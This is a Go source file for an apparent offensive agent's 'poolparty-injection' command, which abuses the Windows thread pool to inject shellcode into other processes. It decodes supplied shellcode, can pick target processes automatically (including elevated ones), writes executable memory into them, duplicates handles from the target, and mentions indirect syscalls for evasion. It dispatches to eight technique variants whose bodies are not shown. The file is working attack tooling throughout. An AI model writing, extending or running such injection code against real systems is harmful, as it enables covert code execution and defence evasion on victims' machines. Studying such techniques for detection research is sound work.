//go:build windows
// +build windows

// poolpartyinjection.go implements all 8 PoolParty injection techniques based on
// SafeBreach Labs research. Types, constants, and NT API declarations are in
// poolpartyinjection_types.go.
//
// Variants:
//   - Variant 1: Worker Factory Start Routine Overwrite - triggers via NtSetInformationWorkerFactory
//   - Variant 2: TP_WORK Insertion - triggers via task queue processing
//   - Variant 3: TP_WAIT Insertion - triggers via SetEvent
//   - Variant 4: TP_IO Insertion - triggers via async file I/O completion
//   - Variant 5: TP_ALPC Insertion - triggers via NtAlpcConnectPort
//   - Variant 6: TP_JOB Insertion - triggers via AssignProcessToJobObject
//   - Variant 7: TP_DIRECT Insertion - triggers via ZwSetIoCompletion
//   - Variant 8: TP_TIMER Insertion - triggers via NtSetTimer2
//
// Reference: https://github.com/SafeBreach-Labs/PoolParty
package commands

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"runtime"
	"strings"
	"unsafe"

	"fawkes/pkg/structs"

	"golang.org/x/sys/windows"
)

// PoolPartyInjectionCommand implements the poolparty-injection command
type PoolPartyInjectionCommand struct{}

// Name returns the command name
func (c *PoolPartyInjectionCommand) Name() string {
	return "poolparty-injection"
}

// Description returns the command description
func (c *PoolPartyInjectionCommand) Description() string {
	return "Perform PoolParty process injection using Windows Thread Pool abuse"
}

// PoolPartyInjectionParams represents the parameters for poolparty-injection
type PoolPartyInjectionParams struct {
	ShellcodeB64 string `json:"shellcode_b64"`
	PID          int    `json:"pid"`
	Variant      int    `json:"variant"`
	Target       string `json:"target"` // "auto", "auto-elevated", "auto-user"
}

// Execute executes the poolparty-injection command
func (c *PoolPartyInjectionCommand) Execute(task structs.Task) structs.CommandResult {
	ensureInjectionAPIs()
	if runtime.GOOS != "windows" {
		return errorResult("Error: This command is only supported on Windows")
	}

	var params PoolPartyInjectionParams
	err := json.Unmarshal([]byte(task.Params), &params)
	if err != nil {
		return errorf("Error parsing parameters: %v", err)
	}

	if params.ShellcodeB64 == "" {
		return errorResult("Error: No shellcode data provided")
	}

	// Auto-select target if target mode is specified
	if params.Target != "" && params.PID <= 0 {
		mode := TargetMode(strings.ToLower(params.Target))
		targets, terr := SelectInjectionTarget(mode)
		if terr != nil {
			return errorf("Target selection failed: %v", terr)
		}
		bestPID, berr := BestTarget(targets)
		if berr != nil {
			return errorf("No suitable target: %v", berr)
		}
		params.PID = int(bestPID)
	}

	if params.PID <= 0 {
		return errorResult("Error: Invalid PID specified")
	}

	shellcode, err := base64.StdEncoding.DecodeString(params.ShellcodeB64)
	if err != nil {
		return errorf("Error decoding shellcode: %v", err)
	}

	if len(shellcode) == 0 {
		return errorResult("Error: Shellcode data is empty")
	}

	var output string
	switch params.Variant {
	case 1:
		output, err = executeVariant1(shellcode, uint32(params.PID))
	case 2:
		output, err = executeVariant2(shellcode, uint32(params.PID))
	case 3:
		output, err = executeVariant3(shellcode, uint32(params.PID))
	case 4:
		output, err = executeVariant4(shellcode, uint32(params.PID))
	case 5:
		output, err = executeVariant5(shellcode, uint32(params.PID))
	case 6:
		output, err = executeVariant6(shellcode, uint32(params.PID))
	case 7:
		output, err = executeVariant7(shellcode, uint32(params.PID))
	case 8:
		output, err = executeVariant8(shellcode, uint32(params.PID))
	default:
		return errorf("Error: Unsupported variant %d", params.Variant)
	}

	if err != nil {
		return errorResult(output + fmt.Sprintf("\n[!] Injection failed: %v", err))
	}

	return successResult(output)
}

// poolPartyProcessAccess is the standard access mask for all PoolParty variants.
const poolPartyProcessAccess = windows.PROCESS_VM_READ | windows.PROCESS_VM_WRITE |
	windows.PROCESS_VM_OPERATION | PROCESS_DUP_HANDLE | windows.PROCESS_QUERY_INFORMATION

// poolPartyInit outputs the shared preamble and opens the target process.
// Returns the process handle and accumulated output. Caller must defer injectCloseHandle.
func poolPartyInit(variant int, desc string, shellcode []byte, pid uint32) (uintptr, string, error) {
	var output string
	output += fmt.Sprintf("[*] PoolParty Variant %d: %s\n", variant, desc)
	if IndirectSyscallsAvailable() {
		output += "[*] Using indirect syscalls (Nt* via stubs)\n"
	}
	output += fmt.Sprintf("[*] Shellcode size: %d bytes\n", len(shellcode))
	output += fmt.Sprintf("[*] Target PID: %d\n", pid)

	hProcess, err := injectOpenProcess(poolPartyProcessAccess, pid)
	if err != nil {
		return 0, output, fmt.Errorf("OpenProcess failed: %v", err)
	}
	output += fmt.Sprintf("[+] Opened target process handle: 0x%X\n", hProcess)
	return hProcess, output, nil
}

// poolPartyAllocShellcode allocates, writes, and protects shellcode in the target process.
// Returns the remote shellcode address and appends to output.
func poolPartyAllocShellcode(hProcess uintptr, shellcode []byte, output string) (uintptr, string, error) {
	addr, err := injectAllocWriteProtect(hProcess, shellcode, PAGE_EXECUTE_READ)
	if err != nil {
		return 0, output, fmt.Errorf("shellcode injection failed: %v", err)
	}
	output += fmt.Sprintf("[+] Shellcode at: 0x%X (W^X: RW→RX)\n", addr)
	return addr, output, nil
}
func hijackProcessHandle(hProcess uintptr, objectType string, desiredAccess uint32) (windows.Handle, error) {
	const STATUS_INFO_LENGTH_MISMATCH = 0xC0000004
	const maxRetries = 5

	// Start with a reasonable initial buffer size and retry with increasing sizes
	var buffer []byte
	var returnLength uint32
	bufferSize := uint32(64 * 1024) // Start with 64KB

	var status uintptr
	for i := 0; i < maxRetries; i++ {
		buffer = make([]byte, bufferSize)
		status, _, _ = procNtQueryInformationProcess.Call(
			hProcess,
			uintptr(ProcessHandleInformation),
			uintptr(unsafe.Pointer(&buffer[0])),
			uintptr(bufferSize),
			uintptr(unsafe.Pointer(&returnLength)),
		)

		if status == 0 {
			break // Success
		}

		if status == STATUS_INFO_LENGTH_MISMATCH {
			// Double the buffer size for next attempt, or use returnLength if provided
			if returnLength > bufferSize {
				bufferSize = returnLength + 4096
			} else {
				bufferSize *= 2
			}
			continue
		}

		// Some other error
		return 0, fmt.Errorf("NtQueryInformationProcess failed: 0x%X", status)
	}

	if status != 0 {
		return 0, fmt.Errorf("NtQueryInformationProcess failed after %d retries: 0x%X (buffer size: %d)", maxRetries, status, bufferSize)
	}

	// Parse handle information
	handleInfo := (*PROCESS_HANDLE_SNAPSHOT_INFORMATION)(unsafe.Pointer(&buffer[0]))
	handleEntrySize := unsafe.Sizeof(PROCESS_HANDLE_TABLE_ENTRY_INFO{})
	handleArrayOffset := unsafe.Sizeof(PROCESS_HANDLE_SNAPSHOT_INFORMATION{})

	// Iterate through handles
	for i := uintptr(0); i < uintptr(handleInfo.NumberOfHandles); i++ {
		entryOffset := handleArrayOffset + (i * handleEntrySize)
		if entryOffset+handleEntrySize > uintptr(len(buffer)) {
			break
		}

		entry := (*PROCESS_HANDLE_TABLE_ENTRY_INFO)(unsafe.Pointer(&buffer[entryOffset]))

		// Try to duplicate the handle
		var duplicatedHandle windows.Handle
		err := windows.DuplicateHandle(
			windows.Handle(hProcess),
			entry.HandleValue,
			windows.CurrentProcess(),
			&duplicatedHandle,
			desiredAccess,
			false,
			0,
		)
		if err != nil {
			continue
		}

		// Query the object type
		typeName, err := getObjectTypeName(duplicatedHandle)
		if err != nil {
			windows.CloseHandle(duplicatedHandle)
			continue
		}

		if typeName == objectType {
			return duplicatedHandle, nil
		}

		windows.CloseHandle(duplicatedHandle)
	}

	return 0, fmt.Errorf("failed to find handle of type: %s", objectType)
}

// getObjectTypeName queries the type name of an object handle
func getObjectTypeName(handle windows.Handle) (string, error) {
	// First call to get required buffer size
	var returnLength uint32
	procNtQueryObject.Call(
		uintptr(handle),
		uintptr(ObjectTypeInformation),
		0,
		0,
		uintptr(unsafe.Pointer(&returnLength)),
	)

	if returnLength == 0 {
		returnLength = 256
	}

	buffer := make([]byte, returnLength)
	status, _, _ := procNtQueryObject.Call(
		uintptr(handle),
		uintptr(ObjectTypeInformation),
		uintptr(unsafe.Pointer(&buffer[0])),
		uintptr(returnLength),
		uintptr(unsafe.Pointer(&returnLength)),
	)
	if status != 0 {
		return "", fmt.Errorf("NtQueryObject failed: 0x%X", status)
	}

	// Parse PUBLIC_OBJECT_TYPE_INFORMATION
	typeInfo := (*PUBLIC_OBJECT_TYPE_INFORMATION)(unsafe.Pointer(&buffer[0]))

	// Convert UNICODE_STRING to Go string
	if typeInfo.TypeName.Buffer == nil || typeInfo.TypeName.Length == 0 {
		return "", fmt.Errorf("empty type name")
	}

	typeName := windows.UTF16PtrToString(typeInfo.TypeName.Buffer)
	return typeName, nil
}
